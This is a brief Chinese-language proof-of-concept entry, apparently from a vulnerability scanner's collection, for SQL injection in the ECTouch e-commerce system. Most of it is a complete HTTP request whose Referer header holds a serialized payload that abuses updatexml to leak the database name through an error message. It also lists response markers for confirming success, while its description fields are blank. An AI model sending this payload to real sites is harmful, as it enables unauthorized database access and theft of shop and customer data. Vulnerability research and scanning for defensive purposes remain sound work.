﻿# ECTouch 电商系统SQL注入

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /index.php?m=default&c=user&a=register&u=0 HTTP/1.1
Referer: 554fcae493e564ee0dc75bdf2ebf94cabought_notes|a:1:{s:2:"id";s:49:"0&&updatexml(1,concat(0x7e,(database()),0x7e),1)#";}
```

> 响应代码特征：-1

> 响应内容特征：syntax

> 上传文件定位：

> 验证文件来源：ECTouch 电商系统SQL注入.poc
